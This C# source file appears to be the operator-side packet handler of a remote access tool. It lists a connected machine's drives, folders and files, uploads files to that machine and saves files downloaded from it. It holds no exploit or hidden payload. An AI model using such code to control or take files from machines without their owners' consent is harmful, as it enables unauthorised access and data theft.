using Server.Forms;
using Server.MessagePack;
using Server.Connection;
using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using System.Threading;
using System.Threading.Tasks;
using Server.Helper;
using System.Diagnostics;
using System.Collections.Generic;
using System.Linq;

namespace Server.Handle_Packet
{
    public class HandleFileManager
    {
        public async void FileManager(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                switch (unpack_msgpack.ForcePathObject("Command").AsString)
                {
                    case "getDrivers":
                        {
                            FormFileManager FM = (FormFileManager)Application.OpenForms["fileManager:" + unpack_msgpack.ForcePathObject("ID").AsString];
                            if (FM != null)
                            {
                                FM.Client = client;
                                FM.listView1.Enabled = true;
                                FM.toolStripStatusLabel1.Text = "";
                                FM.listView1.Items.Clear();
                                string[] driver = unpack_msgpack.ForcePathObject("Driver").AsString.Split(new[] { "-=>" }, StringSplitOptions.None);
                                for (int i = 0; i < driver.Length; i++)
                                {
                                    if (driver[i].Length > 0)
                                    {
                                        ListViewItem lv = new ListViewItem();
                                        lv.Text = driver[i];
                                        lv.ToolTipText = driver[i];
                                        if (driver[i + 1] == "Fixed") lv.ImageIndex = 1;
                                        else if (driver[i + 1] == "Removable") lv.ImageIndex = 2;
                                        else lv.ImageIndex = 1;
                                        FM.listView1.Items.Add(lv);
                                    }
                                    i += 1;
                                }
                            }
                            break;
                        }

                    case "getPath":
                        {
                            FormFileManager FM = (FormFileManager)Application.OpenForms["fileManager:" + unpack_msgpack.ForcePathObject("ID").AsString];
                            if (FM != null)
                            {
                                FM.toolStripStatusLabel1.Text = unpack_msgpack.ForcePathObject("CurrentPath").AsString;
                                if (FM.toolStripStatusLabel1.Text.EndsWith("\\"))
                                {
                                    FM.toolStripStatusLabel1.Text = FM.toolStripStatusLabel1.Text.Substring(0, FM.toolStripStatusLabel1.Text.Length - 1);
                                }
                                if (FM.toolStripStatusLabel1.Text.Length == 2)
                                {
                                    FM.toolStripStatusLabel1.Text = FM.toolStripStatusLabel1.Text + "\\";
                                }

                                FM.listView1.BeginUpdate();
                                //
                                FM.listView1.Items.Clear();
                                FM.listView1.Groups.Clear();
                                FM.toolStripStatusLabel3.Text = "";

                                ListViewGroup groupFolder = new ListViewGroup("Folders");
                                ListViewGroup groupFile = new ListViewGroup("Files");

                                FM.listView1.Groups.Add(groupFolder);
                                FM.listView1.Groups.Add(groupFile);

                                FM.listView1.Items.AddRange(await Task.Run(() => GetFolders(unpack_msgpack, groupFolder).ToArray()));
                                FM.listView1.Items.AddRange(await Task.Run(() => GetFiles(unpack_msgpack, groupFile, FM.imageList1).ToArray()));
                                //
                                FM.listView1.Enabled = true;
                                FM.listView1.EndUpdate();
                                
                                FM.toolStripStatusLabel2.Text = $"       Folder[{FM.listView1.Groups[0].Items.Count}]   Files[{FM.listView1.Groups[1].Items.Count}]";
                            }
                            break;
                        }

                    case "reqUploadFile":
                        {
                            FormDownloadFile FD = (FormDownloadFile)Application.OpenForms[unpack_msgpack.ForcePathObject("ID").AsString];
                            if (FD != null)
                            {
                                FD.Client = client;
                                FD.timer1.Start();
                                MsgPack msgpack = new MsgPack();
                                msgpack.ForcePathObject("Packet").AsString = "fileManager";
                                msgpack.ForcePathObject("Command").AsString = "uploadFile";
                                await msgpack.ForcePathObject("File").LoadFileAsBytes(FD.FullFileName);
                                msgpack.ForcePathObject("Name").AsString = FD.ClientFullFileName;
                                ThreadPool.QueueUserWorkItem(FD.Send, msgpack.Encode2Bytes());
                            }
                            break;
                        }

                    case "error":
                        {
                            FormFileManager FM = (FormFileManager)Application.OpenForms["fileManager:" + unpack_msgpack.ForcePathObject("ID").AsString];
                            if (FM != null)
                            {
                                FM.listView1.Enabled = true;
                                FM.toolStripStatusLabel3.ForeColor = Color.Red;
                                FM.toolStripStatusLabel3.Text = unpack_msgpack.ForcePathObject("Message").AsString;
                            }
                            break;
                        }

                }
            }
            catch { }
        }
        public async void SocketDownload(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                switch (unpack_msgpack.ForcePathObject("Command").AsString)
                {
                    case "pre":
                        {

                            string dwid = unpack_msgpack.ForcePathObject("DWID").AsString;
                            string file = unpack_msgpack.ForcePathObject("File").AsString;
                            string size = unpack_msgpack.ForcePathObject("Size").AsString;
                            FormDownloadFile SD = (FormDownloadFile)Application.OpenForms["socketDownload:" + dwid];
                            if (SD != null)
                            {
                                SD.Client = client;
                                SD.labelfile.Text = Path.GetFileName(file);
                                SD.FileSize = Convert.ToInt64(size);
                                SD.timer1.Start();
                            }
                            break;
                        }

                    case "save":
                        {
                            try
                            {
                                string dwid = unpack_msgpack.ForcePathObject("DWID").AsString;
                                FormDownloadFile SD = (FormDownloadFile)Application.OpenForms["socketDownload:" + dwid];
                                if (SD != null)
                                {
                                    string filename = Path.Combine(SD.FullPath, unpack_msgpack.ForcePathObject("Name").AsString);
                                    string filemanagerPath = SD.FullPath;

                                    if (!Directory.Exists(filemanagerPath))
                                        Directory.CreateDirectory(filemanagerPath);
                                    if (File.Exists(filename))
                                    {
                                        File.Delete(filename);
                                        await Task.Delay(500);
                                    }
                                    await Task.Run(() => SaveFileAsync(unpack_msgpack.ForcePathObject("File"), filename));
                                    SD.Close();
                                }
                            }
                            catch { }
                            break;
                        }
                }

            }
            catch { }
        }

        private async Task SaveFileAsync(MsgPack unpack_msgpack, string name)
        {
            await unpack_msgpack.SaveBytesToFile(name);
        }

        private List<ListViewItem> GetFolders(MsgPack unpack_msgpack, ListViewGroup listViewGroup)
        {
            string[] _folder = unpack_msgpack.ForcePathObject("Folder").AsString.Split(new[] { "-=>" }, StringSplitOptions.None);
            List<ListViewItem> lists = new List<ListViewItem>();
            int numFolders = 0;
            for (int i = 0; i < _folder.Length; i++)
            {
                if (_folder[i].Length > 0)
                {
                    ListViewItem lv = new ListViewItem();
                    lv.Text = _folder[i];
                    lv.ToolTipText = _folder[i + 1];
                    lv.Group = listViewGroup;
                    lv.ImageIndex = 0;
                    lists.Add(lv);
                    numFolders += 1;
                }
                i += 1;
            }
            return lists;
        }

        private List<ListViewItem> GetFiles(MsgPack unpack_msgpack, ListViewGroup listViewGroup, ImageList imageList1)
        {
            string[] _files = unpack_msgpack.ForcePathObject("File").AsString.Split(new[] { "-=>" }, StringSplitOptions.None);
            List<ListViewItem> lists = new List<ListViewItem>();
            for (int i = 0; i < _files.Length; i++)
            {
                if (_files[i].Length > 0)
                {
                    ListViewItem lv = new ListViewItem();
                    lv.Text = Path.GetFileName(_files[i]);
                    lv.ToolTipText = _files[i + 1];
                    Image im = Image.FromStream(new MemoryStream(Convert.FromBase64String(_files[i + 2])));

                    Program.form1.Invoke((MethodInvoker)(() =>
                    {
                           imageList1.Images.Add(_files[i + 1], im);
                    }));
                    lv.ImageKey = _files[i + 1];
                    lv.Group = listViewGroup;
                    lv.SubItems.Add(Methods.BytesToString(Convert.ToInt64(_files[i + 3])));
                    lists.Add(lv);
                }
                i += 3;
            }
            return lists;
        }
    }
}
